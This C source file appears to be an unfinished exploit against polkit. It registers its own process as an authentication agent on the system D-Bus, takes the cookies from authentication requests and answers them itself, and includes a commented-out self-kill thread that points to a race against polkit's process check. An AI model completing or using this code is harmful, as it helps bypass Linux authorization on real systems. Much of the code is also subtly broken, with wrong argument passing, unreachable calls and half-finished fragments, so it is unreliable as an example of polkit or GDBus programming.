#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <dbus/dbus.h>
#include <unistd.h>
#include <gio/gio.h>
#include <glib/gprintf.h>
#include <gio/gdbusconnection.h>
#include <dbus/dbus-glib-lowlevel.h>
#include <pthread.h>

char *action_id;
char *cookie;
int64_t start_time = 0;

int call_register() {
    // Reference : polkit_authority_register_authentication_agent
    // https://github.dev/wingo/polkit/blob/master/src/polkit/polkitauthority.c#L1053

    GDBusConnection *connetion;
    GError *dbus_error = NULL;
    GCancellable       *cancellable = NULL;
    GVariant *subject_value;
     
    
    const gchar *locale = "en_US.UTF-8";
    const gchar *object_path = "/org/freedesktop/PolicyKit1/AuthenticationAgent";

    GVariant *dict;
    GVariantBuilder builder;

    g_variant_builder_init (&builder, G_VARIANT_TYPE ("a{sv}"));
    const gchar *kind;
    kind = "unix-process";
    g_variant_builder_add (&builder, "{sv}", "pid", getpid());
    g_variant_builder_add (&builder, "{sv}", "start-time", start_time);
    dict = g_variant_builder_end (&builder);
    subject_value = g_variant_new ("(s@a{sv})", kind, dict);

    connetion = g_bus_get_sync (G_BUS_TYPE_SYSTEM, cancellable, &dbus_error);
    g_dbus_connection_call(
        connetion,
        "org.freedesktop.PolicyKit1",
        "/org/freedesktop/PolicyKit1/Authority",
        "org.freedesktop.PolicyKit1.Authority",
        "RegisterAuthenticationAgent",
        g_variant_new("(@(sa{sv})&s&s)", &subject_value, &locale, &object_path),
        NULL,
        G_DBUS_CALL_FLAGS_ALLOW_INTERACTIVE_AUTHORIZATION,
        -1,
        NULL,
        NULL,
        NULL 
    );

    return 0;
}

// DBusHandlerResult server_message_handler(DBusConnection *conn, DBusMessage *message, void *data);
// const DBusObjectPathVTable server_vtable = {
// 	.message_function = server_message_handler
// };


void *kill_myself(){
    
    int pid = getpid();

    sleep(0.00001);
    kill(pid, SIGKILL);


    return 0;
}

int server_handle_authentication_agent_response2(char *cookie, GVariant *identities )
{
    //https://github.dev/wingo/polkit/blob/master/src/polkitbackend/polkitbackendauthority.c#L1065
    // GError *dbus_error = NULL;
    // GCancellable       *cancellable = NULL;
    GDBusConnection *connetion;

    // connetion = g_bus_get_sync(G_BUS_TYPE_SYSTEM, cancellable, &dbus_error);
    connetion = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, NULL);
    g_dbus_connection_call(
        connetion, 
        "org.freedesktop.PolicyKit1",
        "/org/freedesktop/PolicyKit1/Authority",
        "org.freedesktop.PolicyKit1.Authority",
        "AuthenticationAgentResponse2",
        g_variant_new("(u&s@(sa{sv}))", getpid(), cookie, identities),
        NULL,
        G_DBUS_CALL_FLAGS_ALLOW_INTERACTIVE_AUTHORIZATION,
        -1,
        NULL,
        NULL,
        NULL
        );

    return 0;
}


// DBusHandlerResult server_message_handler(DBusConnection *conn, DBusMessage *message, void *data){

//     DBusHandlerResult result;

//     if (dbus_message_is_method_call(message, "org.freedesktop.PolicyKit1.Authority","BeginAuthentication")){
        
//         const char *icon_name ;
//         const char *details_gvariant;
//         const char *identities_gvariant;
//         const char *msg;

        
//         printf("[*] Received authentication request\n");
//         printf("[*] Action ID: %s\n", action_id);
//         printf("[*] Cookie: %s\n", cookie);

//         DBusError err;
//          //https://github.dev/wingo/polkit/blob/master/src/polkitagent/polkitagentlistener.c#L636
//         dbus_error_init(&err);
//         dbus_message_get_args(message, &err, 
//             DBUS_TYPE_STRING, &action_id,
//             DBUS_TYPE_STRING, &msg,
//             DBUS_TYPE_STRING, &icon_name, 
//             DBUS_TYPE_VARIANT &details_gvariant, 
//             DBUS_TYPE_STRING, &cookie, 
//             DBUS_TYPE_VARIANT,&identities_gvariant,
//             DBUS_TYPE_INVALID
//             );


//         details_new_for_

//         pthread_t ntid;
//         pthread_create(&ntid, NULL, kill_myself, NULL); // kill self 

        
//     // GVariantIter iter;
//     // g_variant_iter_init (&iter, identities_gvariant);
//     server_handle_authentication_agent_response2 (cookie, iter);

    

//     return result;

// }

static void
auth_agent_handle_begin_authentication (
                                         GVariant               *parameters,
                                         GDBusMethodInvocation  *invocation)
{

    const gchar *message;
    const gchar *icon_name;
    GVariant    *details_gvariant;
    GVariant    *identities_gvariant;

    GVariantIter iter;

    g_variant_get (parameters,
                    "(&s&s&s@a{ss}&s@a(sa{sv}))",
                    &action_id,
                    &message,
                    &icon_name,
                    &details_gvariant,
                    &cookie,
                    &identities_gvariant);

    g_variant_iter_init (&iter, identities_gvariant);

    server_handle_authentication_agent_response2(cookie, identities_gvariant);

}




static void auth_agent_handle_method_call (GDBusConnection        *connection,
                               const gchar            *sender,
                               const gchar            *object_path,
                               const gchar            *interface_name,
                               const gchar            *method_name,
                               GVariant               *parameters,
                               GDBusMethodInvocation  *invocation,
                               gpointer                user_data)
{

    if (g_strcmp0 (method_name, "BeginAuthentication") == 0){
        auth_agent_handle_begin_authentication ( parameters, invocation);
    }


    // return 0;
    return ;
}

static const GDBusInterfaceVTable auth_agent_vtable =
{
  auth_agent_handle_method_call,
  NULL, /* _handle_get_property */
  NULL  /* _handle_set_property */
};


// struct _GDBusInterfaceInfo
// {
//   /*< public >*/
//   volatile gint         ref_count;
//   gchar                *name;
//   GDBusMethodInfo     **methods;
//   GDBusSignalInfo     **signals;
//   GDBusPropertyInfo   **properties;
//   GDBusAnnotationInfo **annotations;
// };
// static const GDBusArgInfo * const foo_method1_in_arg_pointers[] = { NULL};
// static const GDBusArgInfo * const foo_method1_out_arg_pointers[] = { NULL};

// static const GDBusMethodInfo foo_method_info_method1 = { 
//     -1,
//     "BeginAuthentication",
//     (GDBusArgInfo **) &foo_method1_in_arg_pointers,
//     (GDBusArgInfo **) &foo_method1_out_arg_pointers,
//     NULL
// };

// static const GDBusSignalInfo * const foo_signal_info_pointers[] = {NULL};
// static const GDBusPropertyInfo * const foo_property_info_pointers[] ={ NULL};

// static const GDBusInterfaceInfo agent_interface = 
// {
//     -1,
//     "org.freedesktop.PolicyKit1",
//     (GDBusMethodInfo **) &foo_method_info_method1,
//     (GDBusSignalInfo **) &foo_signal_info_pointers,
//     (GDBusPropertyInfo **) &foo_property_info_pointers,
//     NULL,

// };


static const char *authority_dbus_spec =
  "<node>"
  "  <interface name='org.freedesktop.PolicyKit1.AuthenticationAgent'>"
  "    <method name='BeginAuthentication'>"
  "      <arg type='s' name='action_id' direction='in'/>"
  "      <arg type='s' name='message' direction='in'/>"
  "      <arg type='s' name='icon_name' direction='in'/>"
  "      <arg type='a{ss}' name='details' direction='in'/>"
  "      <arg type='s' name='cookie' direction='in'/>"
  "      <arg type='a(sa{sv})' name='identities' direction='in'/>"
  "    </method>"
  "    <method name='CancelAuthentication'>"
  "      <arg type='s' name='cookie' direction='in'/>"
  "    </method>"
  "  </interface>"
  "</node>";


int PolkitAuthenticationAgent(){

    // Reference ï¼šhttps://github.dev/wingo/polkit/blob/master/src/examples/cancel.c#L142
    GMainLoop *loop;
    GDBusConnection *conn;
    GDBusInterfaceInfo *ifaceinfo;
    GDBusNodeInfo *nodeinfo;
    GError *dbus_error = NULL;
    // GCancellable *cancellable = NULL;

    
    
    // conn = g_bus_get(G_BUS_TYPE_SYSTEM, cancellable, &dbus_error, NULL);
    
    conn = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, NULL);

    nodeinfo = g_dbus_node_info_new_for_xml (authority_dbus_spec, &dbus_error);
    if (nodeinfo == NULL)
    {
        fprintf(stderr, "some error %s\n", dbus_error->message);
    }

    ifaceinfo = g_dbus_node_info_lookup_interface (nodeinfo, "org.freedesktop.PolicyKit1.AuthenticationAgent");
    // https://cs.github.com/dylanmccall/rhythmbox-songinfo-context-menu/blob/cd37a61174863c56f4b12f9d1d5cf4573002d956/rhythmdb/rhythmdb-dbus.c#L39
    g_dbus_connection_register_object(conn, 
        "/org/freedesktop/PolicyKit1/AuthenticationAgent", 
        ifaceinfo,
        &auth_agent_vtable,
        NULL,
        NULL,
        &dbus_error);
    
    

    loop = g_main_loop_new(NULL, FALSE);
    g_main_loop_run(loop);
    // char temp[200] = {0};
    // FILE*p = popen("cat /proc/self/stat | tr -s ' ' | awk {'print $22'}", "r");
    // fread(temp, 10, 1, p);
    // start_time = int64_t(temp);
    call_register();
    printf("[*] D-Bus message loop new running ...\n");


    return 0;
}
